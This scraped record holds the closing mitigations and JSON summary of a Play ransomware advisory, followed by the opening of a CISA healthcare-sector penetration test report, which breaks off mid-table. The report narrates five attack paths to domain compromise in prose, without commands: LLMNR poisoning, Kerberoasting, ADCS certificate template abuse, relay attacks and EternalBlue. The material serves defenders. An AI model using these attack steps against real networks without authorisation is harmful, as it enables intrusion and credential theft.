security updates. If unable to patch, then disable Outlook Web Access (OWA) until updates 
are able to be undertaken. Also see Patching Applications and Operating Systems | 
Cyber.gov.au. 
• 
Segment networks [CPG 2.F] to prevent the spread of ransomware. Network segmentation 
can help prevent the spread of ransomware by controlling traffic flows between—and access 
to—various subnetworks and by restricting adversary lateral movement. Also see 
Implementing Network Segmentation and Segregation. 
• 
Identify, detect, and investigate abnormal activity and potential traversal of the 
indicated ransomware with a networking monitoring tool. To aid in detecting the 
ransomware, implement a tool that logs and reports all network traffic, including lateral 
movement activity on a network [CPG 1.E]. Endpoint detection and response (EDR) tools are 
particularly useful for detecting lateral connections as they have insight into common and 
uncommon network connections for each host. 
• 
Filter network traffic by preventing unknown or untrusted origins from accessing remote 
services on internal systems. This prevents actors from directly connecting to remote access 
services they have established for persistence. Also see Inbound Traffic Filtering – Technique 
D3-ITF. 
• 
Install, regularly update, and enable real time detection for antivirus software on all 
hosts. 
• 
Review domain controllers, servers, workstations, and active directories for new and/or 
unrecognized accounts [CPG 1.A, 2.O]. 
• 
Audit user accounts with administrative privileges and configure access controls according 
to the principle of least privilege [CPG 2.E]. 
• 
Disable unused ports [CPG 2.V]. 
• 
Consider adding an email banner to emails [CPG 2.M] received from outside your 
organization. 
• 
Disable hyperlinks in received emails. 
• 
Implement time-based access for accounts set at the admin level and higher. For 
example, the just-in-time (JIT) access method provisions privileged access when needed and 
can support enforcement of the principle of least privilege (as well as the Zero Trust model). 
This is a process where a network-wide policy is set in place to automatically disable admin 
accounts at the Active Directory level when the account is not in direct need. Individual users 
may submit their requests through an automated process that grants them access to a 
specified system for a set timeframe when they need to support the completion of a certain 
task.  
• 
Disable command-line and scripting activities and permissions. Privileged escalation and 
lateral movement often depend on software utilities running from the command line. If threat 
actors are not able to run these tools, they will have difficulty escalating privileges and/or 
moving laterally [CPG 2.E]. 
 
 
 
Page 9 of 10  |  Product ID: AA23-352A 
FBI | CISA | ACSC  
TLP:CLEAR 
 
TLP:CLEAR 
• 
Maintain offline backups of data and regularly maintain backup and restoration [CPG 2.R]. 
By instituting this practice, an organization ensures they will not be severely interrupted, 
and/or only have irretrievable data. 
• 
Ensure backup data is encrypted, immutable (i.e., cannot be altered or deleted), and 
covers the entire organization’s data infrastructure [CPG 2.K]. 
VALIDATE SECURITY CONTROLS 
In addition to applying mitigations, the FBI, CISA, and ASD’s ACSC recommend exercising, testing, 
and validating your organization’s security program against the threat behaviors mapped to the 
MITRE ATT&CK for Enterprise framework in this advisory. The FBI, CISA, and ASD’s ACSC 
recommend testing your existing security controls inventory to assess how they perform against the 
ATT&CK techniques described in this advisory. 
To get started: 
1. Select an ATT&CK technique described in this advisory (see Tables 3-11). 
2. Align your security technologies against this technique. 
3. Test your technologies against this technique. 
4. Analyze your detection and prevention technologies performance. 
5. Repeat the process for all security technologies to obtain a set of comprehensive performance 
data. 
6. Tune your security program, including people, processes, and technologies, based on the 
data generated by this process. 
The FBI, CISA, and ASD’s ACSC recommend continually testing your security program at scale and 
in a production environment to ensure optimal performance against the MITRE ATT&CK techniques 
identified in this advisory. 
RESOURCES 
• 
Stopransomware.gov is a whole-of-government approach that gives one central location for 
ransomware resources and alerts. 
• 
Resource to mitigate a ransomware attack: #StopRansomware Guide. 
• 
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness 
Assessment. 
REPORTING 
The FBI is seeking any information that can be shared, to include boundary logs showing 
communication to and from foreign IP addresses, a sample ransom note, communications with Play 
ransomware actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an 
encrypted file. 
The FBI, CISA, and ASD’s ACSC do not encourage paying ransom as payment does not guarantee 
victim files will be recovered. Furthermore, payment may also embolden adversaries to target 
additional organizations, encourage other criminal actors to engage in the distribution of ransomware, 
 
 
 
Page 10 of 10  |  Product ID: AA23-352A 
FBI | CISA | ACSC  
TLP:CLEAR 
 
TLP:CLEAR 
and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the 
ransom, the FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field 
Office, the FBI’s Internet Crime Complaint Center (IC3), or CISA via CISA’s 24/7 Operations Center 
(report@cisa.gov or 888-282-0870). 
Australian organizations that have been impacted or require assistance in regard to a ransomware 
incident can contact ASD's ACSC via 1300 CYBER1 (1300 292 371), or by submitting a report to 
cyber.gov.au. 
DISCLAIMER 
The information in this report is being provided “as is” for informational purposes only. CISA and the 
FBI do not endorse any commercial entity, product, company, or service, including any entities, 
products, or services linked within this document. Any reference to specific commercial entities, 
products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not 
constitute or imply endorsement, recommendation, or favoring by CISA or the FBI. 
REFERENCES 
[1] Symantec: Play Ransomware Group Using New Custom Data-Gathering Tools 
[2] TrendMicro: Play Ransomware Spotlight 
[3] SentinelLabs: Ransomware Developers Turn to Intermittent Encryption to Evade Detection 
",#StopRansomware: Play Ransomware,"{
  ""ID"": ""AA23-352A"",
  ""URL"": ""https://www.cisa.gov/tlp/"",
  ""Title"": ""#StopRansomware: Play Ransomware"",
  ""Release Date"": ""December 18, 2023"",
  ""Last Updated"": ""December 18, 2023"",
  ""Severity"": ""High"",
  ""Affected Systems"": [
    ""Businesses and critical infrastructure in North America, South America, and Europe"",
    ""Information Technology systems primarily through FortiOS and Microsoft Exchange vulnerabilities""
  ],
  ""Summary"": ""This advisory outlines the activities of the Play ransomware group which has been actively compromising global entities since June 2022, using techniques like double extortion to impact operations and financially extort the entities."",
  ""Procedures"": {
    ""Initial Access"": ""Gains access through exploitation of vulnerabilities and use of valid accounts."",
    ""Exfiltration and Encryption"": ""Data is first exfiltrated then systems are encrypted to enforce ransom demands.""
  },
  ""Tactics"": {
    ""Initial Access"": ""Exploitation of public-facing applications and abuse of valid accounts to gain initial access."",
    ""Impact"": ""Uses a double-extortion model by encrypting victim data and threatening publication unless ransom is paid.""
  },
  ""Techniques"": {
    ""Credential Dumping"": ""Use of Mimikatz and other tools for dumping credentials to facilitate unauthorized access."",
    ""Data Encrypted for Impact"": ""Employment of sophisticated AES-RSA hybrid encryption to lock access to data."",
    ""Exfiltration Over Alternative Protocol"": ""Utilization of tools like WinSCP for secure data exfiltration.""
  },
  ""Threat Actions"": [
    ""Exploitation of known vulnerabilities in FortiOS and Microsoft Exchange."",
    ""Exfiltration of sensitive corporate data."",
    ""Deployment of ransomware encrypting critical operational data.""
  ],
  ""Indicators of Compromise"": {
    ""IPs"": [],
    ""Domains"": [],
    ""Hashes"": [
      ""453257c3494addafb39cb6815862403e827947a1e7737eb8168cd10522465deb"",
      ""47c7cee3d76106279c4c28ad1de3c833c1ba0a2ec56b0150586c7e8480ccae57"",
      ""75404543de25513b376f097ceb383e8efb9c9b95da8945fd4aa37c7b2f226212""
    ]
  },
  ""Mitigation Strategies"": ""Recommended actions include prioritizing the remediation of known vulnerabilities, enabling multifactor authentication, regularly updating software, segmenting networks, and deploying robust backup and recovery measures."",
  ""References"": [
    ""https://www.cisa.gov/tlp/"",
    ""https://stopransomware.gov""
  ]
}"
12-15-2023,https://firebasestorage.googleapis.com/v0/b/ooda-nsec.appspot.com/o/data%2Faa23-349a-risk-vulnerability-assessment-healthcare-public-health-sector.pdf?alt=media&token=2bb7ec30-5733-4d06-b518-e9ccf34fb212," 
 
 
 
 
 
 
All organizations should report incidents and anomalous activity to CISA’s 24/7 Operations Center at 
Report@cisa.gov or (888) 282-0870. When available, please include the following information regarding the 
incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment 
used for the activity; the name of the submitting company or organization; and a designated point of contact. 
This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information 
carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public 
release. Subject to standard copyright rules, TLP:CLEAR information may be distributed without restriction. For 
more information on the Traffic Light Protocol, see cisa.gov/tlp. 
December 15, 2023 
TLP:CLEAR 
Product ID: AA23-349A 
Authored by: 
  
 
TLP:CLEAR 
Enhancing Cyber Resilience: Insights from the 
CISA Healthcare and Public Health Sector Risk 
and Vulnerability Assessment 
SUMMARY 
In 
January 
2023, 
the 
Cybersecurity 
and 
Infrastructure Security Agency (CISA) conducted a 
Risk and Vulnerability Assessment (RVA) at the 
request of a Healthcare and Public Health (HPH) 
sector organization to identify vulnerabilities and 
areas for improvement. An RVA is a two-week 
penetration test of an entire organization, with one 
week spent on external testing and one week spent 
assessing the internal network. As part of the RVA, 
the CISA assessment team conducted web 
application, phishing, penetration, database, and 
wireless assessments. The assessed organization 
was a large organization deploying on-premises 
software. 
During the one-week external assessment, the assessment team did not identify any significant or 
exploitable conditions in externally available systems that may allow a malicious actor to easily obtain 
initial access to the organization’s network. Furthermore, the assessment team was unable to gain 
initial access to the assessed organization through phishing. However, during internal penetration 
testing, the team exploited misconfigurations, weak passwords, and other issues through multiple 
attack paths to compromise the organization’s domain. 
In coordination with the assessed organization, CISA is releasing this Cybersecurity Advisory (CSA) 
detailing the RVA team’s activities and key findings to provide network defenders and software 
manufacturers recommendations for improving their organizations’ and customers’ cyber posture, 
Actions to take today to harden your 
internal environment to mitigate 
follow-on activity after initial access. 
• 
Use phishing-resistant multi-factor 
authentication (MFA) for all 
administrative access. 
• 
Verify the implementation of 
appropriate hardening measures, and 
change, remove, or deactivate all 
default credentials. 
• 
Implement network segregation 
controls. 
 
 
 
 
TLP:CLEAR 
 
CISA  
Page 2 of 27  |  Product ID: AA23-349A 
TLP:CLEAR 
 
which reduces the impact of follow-on activity after initial access. CISA encourages the HPH sector 
and other critical infrastructure organizations deploying on-premises software, as well as software 
manufacturers, to apply the recommendations in the Mitigations section of this CSA to harden 
networks against malicious activity and to reduce the likelihood of domain compromise. 
TECHNICAL DETAILS 
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 14. See the MITRE 
ATT&CK Tactics and Techniques section for tables of the threat actors’ activity mapped to MITRE 
ATT&CK® tactics and techniques with corresponding mitigation and/or detection recommendations. 
For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA 
and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool. 
Introduction 
CISA has authority to, upon request, provide analyses, expertise, and other technical assistance to 
critical infrastructure owners and operators and provide operational and timely technical assistance to 
federal and non-federal entities with respect to cybersecurity risks. See generally 6 U.S.C. §§ 
652(c)(5), 659(c)(6). After receiving a request for an RVA from the organization and coordinating 
high-level details of the engagement with certain personnel at the organization, CISA conducted the 
RVA in January 2023. 
During RVAs, CISA tests the security posture of an organization’s network over a two-week period to 
determine the risk, vulnerability, and exploitability of systems and networks. During the first week (the 
external phase), the team tests public facing systems to identify exploitable vulnerabilities. During the 
second week (the internal phase), the team determines the susceptibility of the environment to an 
actor with internal access (e.g., malicious cyber actor or insider threat). The assessment team offers 
five services: 
• 
Web Application Assessment: The assessment team uses commercial and open source 
tools to identify vulnerabilities in public-facing and internal web applications, demonstrating 
how they could be exploited. 
• 
Phishing Assessment: The assessment team tests the susceptibility of staff and 
infrastructure to phishing attacks and determines what impact a phished user workstation 
could have on the internal network. The RVA team crafts compelling email pretexts and 
generates payloads, similar to ones used by threat actors, in order to provide a realistic threat 
perspective to the organization. 
• 
Penetration Testing: The assessment team tests the security of an environment by 
simulating scenarios an advanced cyber actor may attempt. The team’s goals are to establish 
a foothold, escalate privileges, and compromise the domain. The RVA team leverages both 
open source and commercial tools for host discovery, port and service mapping, vulnerability 
discovery and analysis, and vulnerability exploitation. 
• 
Database Assessment: The assessment team uses commercial database tools to review 
databases for misconfigurations and missing patches. 
• 
Wireless Assessment: The assessment team uses specialized wireless hardware to assess 
wireless access points, connected endpoints, and user awareness for vulnerabilities. 
 
 
 
 
TLP:CLEAR 
 
CISA  
Page 3 of 27  |  Product ID: AA23-349A 
TLP:CLEAR 
 
The assessed organization was in the HPH sector. See Table 1 for services in-scope for this RVA. 
Table 1: In-Scope RVA Services 
Phase 
Scope 
Services 
External Assessment 
Publicly available HPH-
organization endpoints 
discovered during scanning 
Penetration Testing 
Phishing Assessment 
Web Application Assessment 
Internal Assessment 
Internally available HPH-
organization endpoints 
discovered during scanning 
Database Assessment 
Penetration Testing 
Web Application Assessment 
Wireless Assessment 
Phase I: External Assessment 
Penetration and Web Application Testing 
The CISA team did not identify any significant or exploitable conditions from penetration or web 
application testing that may allow a malicious actor to easily obtain initial access to the organization’s 
network. 
Phishing Assessment 
The CISA team conducted phishing assessments that included both user and systems testing. 
The team’s phishing assessment was unsuccessful because the organization’s defensive tools 
blocked the execution of the team’s payloads. The payload testing resulted in most of the team’s 
payloads being blocked by host-based protections through a combination of browser, policy, and 
antivirus software. Some of the payloads were successfully downloaded to disk without being 
immediately removed, but upon execution, the antivirus software detected the malicious code and 
blocked it from running. Some payloads appeared to successfully evade host-based protections but 
did not create a connection to the command and control (C2) infrastructure, indicating they may have 
been incompatible with the system or blocked by border protections. 
Since none of the payloads successfully connected to the assessment team’s C2 server, the team 
conducted a credential harvesting phishing campaign. Users were prompted to follow a malicious link 
within a phishing email under the pretext of verifying tax information and were then taken to a fake 
login form. 
While twelve unique users from the organization submitted credentials through the malicious form, the 
CISA team was unable to leverage the credentials because they had limited access to external-facing 
resources. Additionally, the organization had multi-factor authentication (MFA) implemented for cloud 
accounts. Note: At the time of the assessment, the CISA team’s operating procedures did not include 
certain machine-in-the-middle attacks that could have circumvented the form of MFA in place. 
However, it is important to note that tools like Evilginx[1] can be leveraged to bypass non-phishing 
resistant forms of MFA. Furthermore, if a user executes a malicious file, opening a connection to a 
 
 
 
 
TLP:CLEAR 
 
CISA  
Page 4 of 27  |  Product ID: AA23-349A 
TLP:CLEAR 
 
malicious actor’s command and control server, MFA will not prevent the actor from executing 
commands and carrying out actions under the context of that user. 
Phase II: Internal Assessment 
Database, Web Application, and Wireless Testing 
The CISA assessment team did not identify any significant or exploitable conditions from database or 
wireless testing that may allow a malicious actor to easily compromise the confidentiality, integrity, 
and availability of the tested environment. 
The team did identify default credentials [T1078.001] for multiple web interfaces during web 
application testing and used default printer credentials while penetration testing. (See the Attack Path 
2 section for more information.) 
Penetration Testing 
The assessment team starts internal penetration testing with a connection to the organization’s 
network but without a valid domain account. The team’s goal is to compromise the domain by gaining 
domain admin or enterprise administrator-level permissions. Generally, the team first attempts to gain 
domain user access and then escalate privileges until the domain is compromised. This process is 
called the “attack path”—acquiring initial access to an organization and escalating privileges until the 
domain is compromised and/or vital assets for the organization are accessed. The attack path 
requires specialized expertise and is realistic to what adversaries may do in an environment. 
For this assessment, the team compromised the organization’s domain through four unique attack 
paths, and in a fifth attack path the team obtained access to sensitive information. 
See the sections below for a description of the team’s attack paths mapped to the MITRE ATT&CK 
for Enterprise framework. See the Findings section for information on issues that enabled the team to 
compromise the domain. 
Attack Path 1 
The assessment team initiated LLMNR/NBT-NS/mDNS/DHCP poisoning [T1557.001] with 
Responder[2], which works in two steps: 
1. Responder listens to multicast name resolution queries (e.g., LLMNR UDP/5355, NBTNS 
UDP/137) [T1040] and under the right conditions spoofs a response to direct the victim host to 
a CISA-controlled machine on which Responder is running. 
2. Once a victim connects to the machine, Responder exploits the connection to perform 
malicious functions such as stealing credentials or opening a session on a targeted host 
[T1021]. 
With this tool, the CISA team captured fifty-five New Technology Local Area Network Manager 
version 2 (NTLMv2) hashes, including the NTLMv2 hash for a service account. Note: NTLMv2 and 
other variations of the hash protocol are used for clients to join a domain, authenticate between Active 
Directory forests, authenticate between earlier versions of Windows operating systems (OSs), and 
authenticate computers that are not normally a part of the domain.[3] Cracking these passwords may 
 
 
 
 
TLP:CLEAR 
 
CISA  
Page 5 of 27  |  Product ID: AA23-349A 
TLP:CLEAR 
 
enable malicious actors to establish a foothold in the domain and move laterally or elevate their 
privileges if the hash belongs to a privileged account. 
The service account had a weak password, allowing the team to quickly crack it [T1110.002] and 
obtain access to the organization’s domain. With domain access, the CISA assessment team 
enumerated accounts with a Service Principal Name (SPN) set [T1087.002]. SPN is the unique 
service identifier used by Kerberos authentication[4], and accounts with SPN are susceptible to 
Kerberoasting. 
The CISA team used Impacket’s[5] GetUserSPNs tool to request Ticket-Granting Service (TGS) 
tickets for all accounts with SPN set and obtained their Kerberos hashes [T1558.003]. Three of these 
accounts had domain administrator privileges—offline, the team cracked ACCOUNT 1 (which had a 
weak password). 
Using CrackMapExec[6], the assessment team used ACCOUNT 1 [T1078.002] to successfully 
connect to a domain controller (DC). The team confirmed they compromised the domain because 
ACCOUNT 1 had READ,WRITE permissions over the C$ administrative share [T1021.002] (see Figure 
1). 
 
Figure 1: ACCOUNT 1 Domain Admin Privileges 
To further demonstrate the impact of compromising ACCOUNT 1, the assessment team used it to 
access a virtual machine interface. If a malicious actor compromised ACCOUNT 1, they could use it 
to modify, power off [T1529], and/or delete critical virtual machines, including domain controllers and 
file servers. 
Attack Path 2 
The team first mapped the network to identify open web ports [T1595.001], and then attempted to 
access various web interfaces [T1133] with default administrator credentials. The CISA team was 
able to log into a printer interface with a default password and found the device was configured with 
domain credentials to allow employees to save scanned documents to a network share [T1080]. 
While logged into the printer interface as an administrator, the team 1) modified the “Save as file” 
configuration to use File Transfer Protocol (FTP) instead of Server Message Block (SMB) and 2) 
changed the Server Name and Network Path to point to a CISA-controlled machine running 
Responder [T1557]. Then, the team executed a “Connection Test” that sent the username and 
password over FTP [T1187] to the CISA machine running Responder, which captured cleartext 
credentials for a non-privileged domain account (ACCOUNT 2). 
 
 
 
 
TLP:CLEAR 
 
CISA  
Page 6 of 27  |  Product ID: AA23-349A 
TLP:CLEAR 
 
Using ACCOUNT 2 and Certipy[7], the team enumerated potential certificate template vulnerabilities 
found in Active Directory Certificate Services (ADCS). Note: ADCS templates are used to build 
certificates for different types of servers and other entities on an organization’s network. Malicious 
actors can exploit template misconfigurations [T1649] to manipulate the certificate infrastructure into 
issuing fraudulent certificates and/or escalate user privileges to a domain administrator. 
The WebServer template was misconfigured to allow all authenticated users permission to: 
• 
Change the properties of the template (via Object Control Permissions with Write 
Property Principals set to Authenticated Users). 
• 
Enroll for the certificate (via Enrollment Permissions including the Authenticated Users 
group). 
• 
Request a certificate for a different user (via EnrolleeSuppliesSubject set as True). 
See Figure 2 for the displayed certificate template misconfigurations. 
 
Figure 2: Misconfigured Certificate Template Enumerated via Certipy 
The template’s Client Authentication was set to False, preventing the CISA assessment team 
from requesting a certificate that could be used to authenticate to a server in the domain. To 
demonstrate how this misconfiguration could lead to privilege escalation, the assessment team, 
leveraging its status as a mere authenticated user, briefly changed the WebServer template 
 
 
 
 
TLP:CLEAR 
 
CISA  
Page 7 of 27  |  Product ID: AA23-349A 
TLP:CLEAR 
 
properties to set Client Authentication to True so that a certificate could be obtained for server 
authentication, ensuring the property was set back to its original setting of False immediately 
thereafter. 
The team used Certipy with the ACCOUNT 2 credentials to request a certificate for a Domain 
Administrator account (ACCOUNT 3). The team then authenticated to the domain controller as 
ACCOUNT 3 with the generated certificate [T1550] and retrieved the NTLM hash for ACCOUNT 3 
[T1003]. The team used the hash to authenticate to the domain controller [T1550.002] and validated 
Domain Administrator privileges, demonstrating compromise of the domain via the WebServer 
template misconfiguration. 
Attack Path 3 
The CISA team used a tool called CrackMapExec to spray easily guessable passwords [T1110.003] 
across all domain accounts and obtained two sets of valid credentials for standard domain user 
accounts. 
The assessment team leveraged one of the domain user accounts (ACCOUNT 4) to enumerate 
ADCS via Certipy and found that web enrollment was enabled (see Figure 3). If web enrollment is 
enabled, malicious actors can abuse certain services and/or misconfigurations in the environment to 
coerce a server to authenticate to an actor-controlled computer, which can relay the authentication to 
the ADCS web enrollment service and obtain a certificate for the server’s account (known as a relay 
attack). 
 
Figure 3: Misconfigured ADCS Enumerated via Certipy 
The team used PetitPotam [8] with ACCOUNT 4 credentials to force the organization’s domain 
controller to authenticate to the CISA-operated machine and then used Certipy to relay the coerced 
authentication attempt to the ADCS web enrollment service to receive a valid certificate for 
 
 
 
 
TLP:CLEAR 
 
CISA  
Page 8 of 27  |  Product ID: AA23-349A 
TLP:CLEAR 
 
ACCOUNT 5, the domain controller machine account. They used this certificate to acquire a TGT 
[T1558] for ACCOUNT 5. 
With the TGT for ACCOUNT 5, the CISA team used DCSync to dump the NTLM hash [T1003.006] for 
ACCOUNT 3 (a Domain Administrator account [see Attack Path 2 section]), effectively leading to 
domain compromise. 
Attack Path 4 
The CISA team identified several systems on the organization’s network that do not enforce SMB 
signing. The team exploited this misconfiguration to obtain cleartext credentials for two domain 
administrator accounts. 
First, the team used Responder to capture the NTLMv2 hash for a domain administrator account. 
Next, they used Impacket’s NTLMrelayx tool[9] to relay the authentication for the domain 
administrator, opening a SOCKS connection on a host that did not enforce SMB signing. The team 
then used DonPAPI[10] to dump cleartext credentials through the SOCKS connection and obtained 
credentials for two additional domain administrator accounts. 
The CISA team validated the privileges of these accounts by checking for READ,WRITE access on a 
domain controller C$ share [T1039], demonstrating Domain Administrator access and therefore 
domain compromise. 
Attack Path 5 
The team did vulnerability scanning [T1046] and identified a server vulnerable to CVE-2017-0144 (an 
Improper Input Validation [CWE-20] vulnerability known as “EternalBlue” that affects SMB version 1 
[SMBv1] and enables remote code execution [see Figure 4]). 
 
Figure 4: Checking for EternalBlue Vulnerability 
The CISA assessment team then executed a well-known EternalBlue exploit [T1210] and established 
a shell on the server. This shell allowed them to execute commands [T1059.003] under the context of 
the local SYSTEM account. 
With this local SYSTEM account, CISA dumped password hashes from a Security Account Manager 
(SAM) database [T1003.002]. The team parsed the hashes and identified one for a local administrator 
account. Upon parsing the contents of the SAM database dump, the CISA team identified an NTLM 
hash for the local administrator account, which can be used to authenticate to various services. 
The team sprayed the acquired NTLM hash across a network segment and identified multiple 
instances of password reuse allowing the team to access various resources including sensitive 
information with the hash. 
 
 
 
 
TLP:CLEAR 
 
CISA  
Page 9 of 27  |  Product ID: AA23-349A 
TLP:CLEAR 
 
Findings 
Key Issues 
The CISA assessments team identified several findings as potentially exploitable vulnerabilities that 
could compromise the confidentiality, integrity, and availability of the tested environment. Each 
finding, listed below, includes a description with supporting details. See the Mitigations section for 
recommendations on how to mitigate these issues. 
The CISA team rated their findings on a severity scale from critical to informational (see Table 2). 
Table 2: Severity Rating Criteria 
Severity 
Description 
Critical 
Critical vulnerabilities pose an immediate and severe risk to 
the environment because of the ease of exploitation and 
potential impact. Critical items are reported to the customer 
immediately. 
High 
Malicious actors may be able to exercise full control on the 
targeted device. 
Medium 
Malicious actors may be able to exercise some control of the 
targeted device. 
Low 
The vulnerabilities discovered are reported as items of 
interest but are not normally exploitable. Many low items 
reported by security tools are not included in this report 
because they are often informational, unverified, or of minor 
risk. 
Informational 
These vulnerabilities are potential weaknesses within the 
system that cannot be readily exploited. These findings 
represent areas that the customer should be cognizant of, but 
do not require any immediate action. 
The CISA assessment team identified four High severity vulnerabilities and one Medium severity 
vulnerability during penetration testing that contributed to the team’s ability to compromise the 
domain. See Table 3 for a list and description of these findings. 
Table 3: Key Issues Contributing to Domain Compromise 
Issue 
Severity 
Service 
Description 
Poor Credential 
Hygiene: Easily 
Crackable 
Passwords  
High 
Penetration 
Testing 
As part of their assessment, the team 
reviewed the organization’s domain 
password policy and found it was weak 
because the minimum password length was 
 
 
 
 
TLP:CLEAR 
 
CISA  
Page 10 of 27  |  Product ID: AA23-349A 
TLP:CLEAR 
 
Issue 
Severity 
Service 
Description 
set to 8 characters. Passwords less than 15 
characters without randomness are easily 
crackable, and malicious actors with 
minimal technical knowledge can use these 
credentials to access the related services. 
The assessment team was able to easily 
crack many passwords throughout the 
assessment to move laterally and increase 
access within the domain. Specifically, the 
team: 
• Cracked the NTLMv2 hash for a 
domain account, and subsequently 
accessed the domain. (See the Attack 
Path 1 section.) 
Cracked the password hash (obtained via 
Kerberoasting) of a domain administrator 
account and subsequently compromised 
the domain. (See the Attack Path 1 
section.) 
Poor Credential 
Hygiene: 
Guessable 
Credentials 
High 
Penetration 
Testing 
As part of the penetration test, the 
assessment team tested to see if one or 
more services is accessible using a list of 
enumerated usernames alongside an easily 
guessed password. The objective is to see 
if a malicious actor with minimal technical 
knowledge can use these credentials to 
access the related services, enabling them 
to move laterally or escalate privileges. 
Easily guessable passwords are often 
comprised of common words, seasons, 
months and/or years, and are sometimes 
combined with special characters. 
Additionally, phrases or names that are 
popular locally (such as the organization 
being tested or a local sports teams) may 
also be considered easily guessable. 
The team sprayed common passwords 
against domain user accounts and obtained 
valid credentials for standard domain users. 
 
 
 
 
TLP:CLEAR 
 
CISA  
Page 11 of 27  |  Product ID: AA23-349A 
TLP:CLEAR 
 
Issue 
Severity 
Service 
Description 
(See the Attack Path 3 section.) (Cracking 
was not necessary for this attack.) 
Misconfigured 
ADCS Certificate 
Templates 
High 
Penetration 
Testing 
The team identified a WebServer template 
configured to allow all authenticated users 
permission to change the properties of the 
template and obtain certificates for different 
users. The team exploited the template to 
acquire a certificate for a Domain 
Administrator account (see the Attack Path 
2 section). 
Unnecessary 
Network Services 
Enabled 
High 
Penetration 
Testing 
Malicious actors can exploit security 
vulnerabilities and misconfigurations in 
network services, especially legacy 
services. 
The assessment team identified legacy 
name resolution protocols (e.g., NetBIOS, 
LLMNR, mDNS) enabled in the network, 
and abused LLMNR to capture NTLMv2 
hashes, which they then cracked and used 
for domain access. (See the Attack Path 1 
section.) 
The team also identified an ADCS server 
with web enrollment enabled and leveraged 
it to compromise the domain through 
coercion and relaying. (See Attack Path 3 
section.) 
Additionally, the team identified hosts with 
WebClient and Spooler services, which are 
often abused by malicious actors to coerce 
authentication. 
Elevated Service 
Account 
Privileges 
High 
Penetration 
Testing 
Applications often require user accounts to 
operate. These user accounts, which are 
known as service accounts, often require 
elevated privileges. If an application or 
service running with a service account is 
compromised, an actor may have the same 
privileges and access as the service 
account.  
 
 
 
 
TLP:CLEAR 
 
CISA  
Page 12 of 27  |  Product ID: AA23-349A 
TLP:CLEAR 
 
Issue 
Severity 
Service 
Description 
The CISA team identified a service account 
with Domain Administrator privileges and 
used it to access the domain after cracking 
its password (See the Attack Path 1 
section). 
SMB Signing Not 
Enabled 
High 
Penetration 
Testing 
The CISA team identified several systems 
on the organization’s network that do not 
enforce SMB signing and exploited this for 
relayed authentication to obtain cleartext 
credentials for two domain administrator 
accounts. 
Insecure Default 
Configuration: 
Default 
Credentials 
Medium 
Web 
Application 
Assessment 
Many off-the-shelf applications are released 
with built-in administrative accounts using 
predefined credentials that can often be 
found with a simple web search. Malicious 
actors with minimal technical knowledge 
can use these credentials to access the 
related services. 
During testing, the CISA team identified 
multiple web interfaces with default 
administrator credentials and used default 
credentials for a printer interface to capture 
domain credentials of a non-privileged 
domain account. (See the Attack Path 2 
section.) 
In addition to the issues listed above, the team identified three High and seven Medium severity 
findings. These vulnerabilities and misconfigurations may allow a malicious actor to compromise the 
confidentiality, integrity, and availability of the tested environment. See Table 4 for a list and 
description of these findings. 
Table 4: Additional Key Issues 
Issue 
Severity 
Service 
Description 
Poor Credential 
Hygiene: 
Password Reuse 
for Administrator 
and User 
Accounts 
High 
Penetration 
Testing 
Elevated password reuse is when an 
administrator uses the same password for 
their user and administrator accounts. If the 
user account password is compromised, it 
can be used to gain access to the 
administrative account. 
 
 
 
 
TLP:CLEAR 
 
CISA  
Page 13 of 27  |  Product ID: AA23-349A 
TLP:CLEAR 
 
Issue 
Severity 
Service 
Description 
The assessment team identified an 
instance where the same password was set 
for an admin user’s administrative account 
as well as their standard user account. 
Poor Credential 
Hygiene: 
Password Reuse 
for Administrator 
Accounts 
Medium 
Penetration 
Testing 
If administrator passwords are the same for 
various administrator accounts, malicious 
actors can use the password to access all 
systems that share this credential after 
compromising one account. 
The assessment team found multiple 
instances of local administrator accounts 
across various systems using the same 
password. 
Poor Patch 
Management: 
Out-of-Date 
Software 
High 
Penetration 
Testing 
Patches and updates are released to 
address existing and emerging security 
vulnerabilities, and failure to apply the latest 
leaves systems open to attack with publicly 
available exploits. (The risk presented by 
missing patches and updates depends on 
the severity of the vulnerability). 
The assessment team identified several 
unpatched systems including instances of 
CVE-2019-0708 (known as “BlueKeep”) 
and EternalBlue.  
The team was unable to successfully 
compromise the systems with BlueKeep, 
but they did exploit EternalBlue on a server 
to implant a shell on a server with local 
SYSTEM privileges (see the Attack Path 5 
section). 
Poor Patch 
Management: 
Unsupported OS 
or Application 
High 
Penetration 
Testing 
Using software or hardware that is no 
longer supported by the vendor poses a 
significant security risk because new and 
existing vulnerabilities are no longer 
patched). There is no way to address 
security vulnerabilities on these devices to 
ensure that they are secure. The overall 
security posture of the entire network is at 
risk because an attacker can target these 
 
 
 
 
TLP:CLEAR 
 
CISA  
Page 14 of 27  |  Product ID: AA23-349A 
TLP:CLEAR 
 
Issue 
Severity 
Service 
Description 
devices to establish an initial foothold into 
the network. 
The assessment team identified end-of-life 
(EOL) Windows Server 2008 R2 and 
Windows Server 2008 and Windows 5.1. 
Use of Weak 
Authentication 
Measures 
Medium 
Penetration 
Testing 
Applications may have weak or broken 
mechanisms to verify user identity before 
granting user access to protected 
functionalities. Malicious actors can exploit 
these to bypass authentication and gain 
access to use application resources and 
functionality. 
The assessment team abused the Cisco 
Smart Install protocol to obtain 
configuration files for several Cisco devices 
on the organization’s network. These files 
contained encrypted Cisco passwords. 
(The CISA team was unable to crack these 
passwords within the assessment 
timeframe.) 
PII Disclosure 
Medium 
Penetration 
Testing 
The assessment team identified an 
unencrypted Excel file containing PII on a 
file share. 
Hosts with 
Unconstrained 
Delegation 
Enabled 
Unnecessarily 
Medium 
Penetration 
Testing 
The CISA team identified two systems that 
appeared to be configured with 
Unconstrained Delegation enabled. 
Hosts with Unconstrained Delegation 
enabled store the Kerberos TGTs of all 
users that authenticate to that host, 
enabling actors to steal service tickets or 
compromise krbtgt accounts and perform 
golden ticket or silver ticket attacks. 
Although the assessment team was unable 
to fully exploit this configuration because 
